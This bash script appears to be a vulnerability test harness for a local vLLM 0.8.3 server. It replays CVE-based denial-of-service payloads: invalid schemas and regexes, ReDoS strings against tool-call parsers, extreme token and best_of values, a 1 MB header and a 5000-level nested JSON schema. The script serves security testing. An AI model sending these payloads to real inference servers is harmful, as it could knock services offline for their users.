#!/bin/bash
# ══════════════════════════════════════════════════════════════
# LIMAScan: vLLM 0.8.3 Cross-Framework Vulnerability Tests
# Tests patterns from other frameworks against vLLM:
#   Recursion (from llama-cpp LIMA-NEW-003/004)
#   ReDoS (from vLLM CVE-2025-48887, GHSA-j828-28rj-hfhp)
#   Resource Exhaustion (extreme API params)
#   Structured Output Crashes (from vLLM CVE-2025-48942/43/44)
# ══════════════════════════════════════════════════════════════
set +e

DIR="$(cd "$(dirname "$0")" && pwd)"
VLLM_PORT=8000
VLLM_URL="http://localhost:$VLLM_PORT"
RESULTS_FILE="$DIR/payloads/vllm_results.txt"
TIMING_FILE="$DIR/payloads/vllm_timing.txt"
> "$RESULTS_FILE"
> "$TIMING_FILE"

log_result() {
    local pattern="$1" framework="$2" test="$3" result="$4" detail="$5"
    echo "$pattern | $framework | $test | $result | $detail" >> "$RESULTS_FILE"
    echo "  [$result] $pattern/$test → $framework: $detail"
}

echo "=============================================="
echo "LIMAScan: vLLM 0.8.3 Tests"
echo "=============================================="

VLLM_START=$(date +%s)

# ── Check if vLLM server is running ──
echo "[1] Checking if vLLM server is running..."
HEALTH=$(curl -sf "$VLLM_URL/v1/models" --max-time 5 2>&1)
if [ $? -ne 0 ]; then
    echo "  vLLM server not running. Starting it..."
    echo "  Starting vLLM with Qwen2.5-0.5B-Instruct (smallest chat model)..."

    # Start vLLM in background
    export PATH=$HOME/.local/bin:$PATH
    nohup python3 -m vllm.entrypoints.openai.api_server \
        --model Qwen/Qwen2.5-0.5B-Instruct \
        --host 0.0.0.0 --port $VLLM_PORT \
        --max-model-len 2048 \
        --gpu-memory-utilization 0.5 \
        --enforce-eager \
        > /tmp/vllm_server.log 2>&1 &
    VLLM_PID=$!
    echo "  vLLM PID: $VLLM_PID"

    # Wait for server to be ready (model download + loading)
    echo "  Waiting for vLLM to be ready (model download + loading)..."
    for i in $(seq 1 300); do
        if curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
            echo "  vLLM ready after ${i}s"
            break
        fi
        if ! kill -0 $VLLM_PID 2>/dev/null; then
            echo "  ERROR: vLLM process died"
            cat /tmp/vllm_server.log | tail -20
            echo "VLLM_STARTUP | FAILED" >> "$TIMING_FILE"
            exit 1
        fi
        sleep 1
    done
else
    echo "  vLLM already running"
fi

# Detect model name
MODEL=$(curl -sf "$VLLM_URL/v1/models" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['data'][0]['id'])" 2>/dev/null)
echo "  Model: $MODEL"

if [ -z "$MODEL" ]; then
    echo "  ERROR: Could not detect model name"
    exit 1
fi

STARTUP_END=$(date +%s)
STARTUP_TIME=$((STARTUP_END - VLLM_START))
echo "  Startup time: ${STARTUP_TIME}s"

# ── Test start time (excluding startup) ──
TEST_START=$(date +%s)

# ══════════════════════════════════════════════════════════════
# Structured Output Crashes (CVE-2025-48942/43/44 patterns)
# ══════════════════════════════════════════════════════════════
echo ""
echo "--- Structured Output Crashes → vLLM ---"

# Test 1: Invalid JSON schema type (CVE-2025-48942 pattern)
echo "  Testing invalid JSON schema type..."
RESP=$(curl -s -X POST "$VLLM_URL/v1/chat/completions" \
    -H "Content-Type: application/json" \
    --max-time 30 \
    -d "{\"model\":\"$MODEL\",\"messages\":[{\"role\":\"user\",\"content\":\"Say hello\"}],\"response_format\":{\"type\":\"json_schema\",\"json_schema\":{\"name\":\"test\",\"schema\":{\"type\":\"stsring\"}}}}" \
    2>&1 || echo "TIMEOUT")
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Structured Output" "vLLM" "invalid_schema_type" "CRASHED" "Server died on invalid schema type"
else
    if echo "$RESP" | grep -qi "error\|500\|exception"; then
        log_result "Structured Output" "vLLM" "invalid_schema_type" "ERROR_RETURNED" "$(echo "$RESP" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("message","")[:150])' 2>/dev/null || echo "$RESP" | head -c 150)"
    else
        log_result "Structured Output" "vLLM" "invalid_schema_type" "NOT_VULNERABLE" "Server survived"
    fi
fi

# Test 2: Invalid regex pattern (CVE-2025-48943 pattern)
echo "  Testing invalid regex pattern..."
RESP=$(curl -s -X POST "$VLLM_URL/v1/completions" \
    -H "Content-Type: application/json" \
    --max-time 30 \
    -d "{\"model\":\"$MODEL\",\"prompt\":\"hello\",\"max_tokens\":10,\"guided_regex\":\"[.*\"}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Structured Output" "vLLM" "invalid_regex" "CRASHED" "Server died on invalid regex"
else
    if echo "$RESP" | grep -qi "error\|500\|exception"; then
        log_result "Structured Output" "vLLM" "invalid_regex" "ERROR_RETURNED" "$(echo "$RESP" | head -c 150)"
    else
        log_result "Structured Output" "vLLM" "invalid_regex" "NOT_VULNERABLE" "Server survived"
    fi
fi

# Test 3: Invalid tool parameter schema (CVE-2025-48944 pattern)
echo "  Testing invalid tool schema..."
RESP=$(curl -s -X POST "$VLLM_URL/v1/chat/completions" \
    -H "Content-Type: application/json" \
    --max-time 30 \
    -d "{\"model\":\"$MODEL\",\"messages\":[{\"role\":\"user\",\"content\":\"What is weather?\"}],\"tools\":[{\"type\":\"function\",\"function\":{\"name\":\"get_weather\",\"parameters\":{\"type\":\"object\",\"properties\":{\"location\":{\"type\":\"string\",\"pattern\":\"[.*\"}}}}}],\"tool_choice\":\"auto\"}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Structured Output" "vLLM" "invalid_tool_schema" "CRASHED" "Server died on invalid tool schema"
else
    if echo "$RESP" | grep -qi "error\|500\|exception"; then
        log_result "Structured Output" "vLLM" "invalid_tool_schema" "ERROR_RETURNED" "$(echo "$RESP" | head -c 150)"
    else
        log_result "Structured Output" "vLLM" "invalid_tool_schema" "NOT_VULNERABLE" "Server survived"
    fi
fi

# ══════════════════════════════════════════════════════════════
# ReDoS (CVE-2025-48887, GHSA-j828-28rj-hfhp patterns)
# ══════════════════════════════════════════════════════════════
echo ""
echo "--- ReDoS → vLLM ---"

# Test 4: Tool call parser ReDoS (CVE-2025-48887 pattern)
echo "  Testing tool call parser ReDoS..."
# This pattern causes catastrophic backtracking in tool parsers
REDOS_PAYLOAD=$(python3 -c "print('[A(A=\\\\t)' * 25 + 'A(A=,\\\\t')")
RESP=$(curl -s -X POST "$VLLM_URL/v1/chat/completions" \
    -H "Content-Type: application/json" \
    --max-time 15 \
    -d "{\"model\":\"$MODEL\",\"messages\":[{\"role\":\"user\",\"content\":\"hello\"},{\"role\":\"assistant\",\"content\":\"$REDOS_PAYLOAD\"}],\"tools\":[{\"type\":\"function\",\"function\":{\"name\":\"test\",\"parameters\":{\"type\":\"object\",\"properties\":{}}}}]}" \
    2>&1 || echo "TIMEOUT")
if echo "$RESP" | grep -q "TIMEOUT"; then
    log_result "ReDoS" "vLLM" "tool_parser_backtrack" "VULNERABLE" "Request timed out (>15s) — likely ReDoS"
elif ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "ReDoS" "vLLM" "tool_parser_backtrack" "CRASHED" "Server died"
else
    log_result "ReDoS" "vLLM" "tool_parser_backtrack" "NOT_VULNERABLE" "Server survived"
fi

# Test 5: JSON parameter extraction ReDoS (GHSA-j828-28rj-hfhp)
echo "  Testing JSON extraction ReDoS..."
REDOS2=$(python3 -c "print('{\"name\": \"' + 'a' * 50 + '\", \"arguments\": {\"key\": \"' + 'b' * 50 + '\"' + ' ' * 20)")
RESP=$(curl -s -X POST "$VLLM_URL/v1/chat/completions" \
    -H "Content-Type: application/json" \
    --max-time 15 \
    -d "{\"model\":\"$MODEL\",\"messages\":[{\"role\":\"user\",\"content\":\"hello\"},{\"role\":\"assistant\",\"content\":\"$REDOS2\"}],\"tools\":[{\"type\":\"function\",\"function\":{\"name\":\"test\",\"parameters\":{\"type\":\"object\",\"properties\":{}}}}]}" \
    2>&1 || echo "TIMEOUT")
if echo "$RESP" | grep -q "TIMEOUT"; then
    log_result "ReDoS" "vLLM" "json_extraction_backtrack" "VULNERABLE" "Request timed out (>15s)"
elif ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "ReDoS" "vLLM" "json_extraction_backtrack" "CRASHED" "Server died"
else
    log_result "ReDoS" "vLLM" "json_extraction_backtrack" "NOT_VULNERABLE" "Server survived"
fi

# ══════════════════════════════════════════════════════════════
# Resource Exhaustion (extreme API params)
# ══════════════════════════════════════════════════════════════
echo ""
echo "--- Resource Exhaustion → vLLM ---"

# Test 6: Extreme max_tokens
echo "  Testing extreme max_tokens..."
RESP=$(curl -s -X POST "$VLLM_URL/v1/completions" \
    -H "Content-Type: application/json" \
    --max-time 15 \
    -d "{\"model\":\"$MODEL\",\"prompt\":\"hi\",\"max_tokens\":999999999}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Resource Exhaustion" "vLLM" "extreme_max_tokens" "CRASHED" "Server died"
else
    log_result "Resource Exhaustion" "vLLM" "extreme_max_tokens" "NOT_VULNERABLE" "Server survived"
fi

# Test 7: Extreme best_of (CVE-2024-8939 pattern)
echo "  Testing extreme best_of..."
RESP=$(curl -s -X POST "$VLLM_URL/v1/completions" \
    -H "Content-Type: application/json" \
    --max-time 15 \
    -d "{\"model\":\"$MODEL\",\"prompt\":\"hi\",\"max_tokens\":1,\"best_of\":500}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Resource Exhaustion" "vLLM" "extreme_best_of" "CRASHED" "Server died on best_of=500"
else
    if echo "$RESP" | grep -qi "error"; then
        log_result "Resource Exhaustion" "vLLM" "extreme_best_of" "ERROR_RETURNED" "$(echo "$RESP" | head -c 150)"
    else
        log_result "Resource Exhaustion" "vLLM" "extreme_best_of" "NOT_VULNERABLE" "Server survived"
    fi
fi

# Test 8: Large HTTP header (CVE-2025-48956 pattern)
echo "  Testing large HTTP header..."
LARGE_HEADER=$(python3 -c "print('X' * 1048576)")  # 1MB header
RESP=$(curl -s -X POST "$VLLM_URL/v1/completions" \
    -H "Content-Type: application/json" \
    -H "X-Custom: $LARGE_HEADER" \
    --max-time 15 \
    -d "{\"model\":\"$MODEL\",\"prompt\":\"hi\",\"max_tokens\":1}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Resource Exhaustion" "vLLM" "large_http_header" "CRASHED" "Server died on 1MB header"
else
    log_result "Resource Exhaustion" "vLLM" "large_http_header" "NOT_VULNERABLE" "Server survived"
fi

# ══════════════════════════════════════════════════════════════
# Recursion (LIMA-NEW-003/004 pattern applied to vLLM)
# ══════════════════════════════════════════════════════════════
echo ""
echo "--- Recursion → vLLM ---"

# Test 9: Deeply nested JSON schema (LIMA-NEW-004 pattern)
echo "  Testing deeply nested JSON schema (5000 levels)..."
NESTED_SCHEMA=$(python3 -c "
s = '{\"type\":\"integer\"}'
for _ in range(5000):
    s = '{\"type\":\"object\",\"properties\":{\"x\":' + s + '},\"required\":[\"x\"]}'
print(s)
")
RESP=$(curl -s -X POST "$VLLM_URL/v1/chat/completions" \
    -H "Content-Type: application/json" \
    --max-time 30 \
    -d "{\"model\":\"$MODEL\",\"messages\":[{\"role\":\"user\",\"content\":\"Return x=1\"}],\"response_format\":{\"type\":\"json_schema\",\"json_schema\":{\"name\":\"deep\",\"schema\":$NESTED_SCHEMA}}}" \
    2>&1 || echo "TIMEOUT")
sleep 2
if ! curl -sf "$VLLM_URL/v1/models" > /dev/null 2>&1; then
    log_result "Recursion" "vLLM" "nested_json_schema" "CRASHED" "Server died on deeply nested schema"
else
    if echo "$RESP" | grep -qi "error\|500\|exception"; then
        log_result "Recursion" "vLLM" "nested_json_schema" "ERROR_RETURNED" "$(echo "$RESP" | head -c 150)"
    else
        log_result "Recursion" "vLLM" "nested_json_schema" "NOT_VULNERABLE" "Server survived"
    fi
fi

# ══════════════════════════════════════════════════════════════
# No Auth (CVE-2025-30202 pattern — ZMQ binding check)
# ══════════════════════════════════════════════════════════════
echo ""
echo "--- No Auth → vLLM ---"

# Test 10: API accessible without authentication
echo "  Testing no auth..."
RESP=$(curl -sf "$VLLM_URL/v1/models" 2>&1)
if echo "$RESP" | grep -q "data"; then
    log_result "No Auth" "vLLM" "no_auth" "VULNERABLE" "API accessible without auth (by design)"
else
    log_result "No Auth" "vLLM" "no_auth" "NOT_VULNERABLE" "Auth required"
fi

# ══════════════════════════════════════════════════════════════
TEST_END=$(date +%s)
TEST_TIME=$((TEST_END - TEST_START))
TOTAL_TIME=$((TEST_END - VLLM_START))

echo ""
echo "=============================================="
echo "vLLM TIMING SUMMARY"
echo "=============================================="
echo "  Startup (model load): ${STARTUP_TIME}s"
echo "  Tests only:           ${TEST_TIME}s"
echo "  Total:                ${TOTAL_TIME}s"
echo ""

echo "VLLM_STARTUP | ${STARTUP_TIME}s" >> "$TIMING_FILE"
echo "VLLM_TESTS | ${TEST_TIME}s" >> "$TIMING_FILE"
echo "VLLM_TOTAL | ${TOTAL_TIME}s" >> "$TIMING_FILE"

echo "=============================================="
echo "vLLM RESULTS"
echo "=============================================="
cat "$RESULTS_FILE"
echo ""

TOTAL=$(wc -l < "$RESULTS_FILE" | tr -d ' ')
CRASHED=$(grep -c "CRASHED" "$RESULTS_FILE" || true)
VULN=$(grep -c "VULNERABLE" "$RESULTS_FILE" || true)
NOT_VULN=$(grep -c "NOT_VULNERABLE" "$RESULTS_FILE" || true)
ERROR=$(grep -c "ERROR_RETURNED" "$RESULTS_FILE" || true)

echo "Total tests: $TOTAL"
echo "  CRASHED:         $CRASHED"
echo "  VULNERABLE:      $VULN"
echo "  ERROR_RETURNED:  $ERROR"
echo "  NOT_VULNERABLE:  $NOT_VULN"
echo ""

# Stop vLLM if we started it
if [ -n "$VLLM_PID" ]; then
    echo "Stopping vLLM (PID $VLLM_PID)..."
    kill $VLLM_PID 2>/dev/null
    wait $VLLM_PID 2>/dev/null
fi

echo "Results saved to: $RESULTS_FILE"
echo "Timing saved to: $TIMING_FILE"
echo "Done."
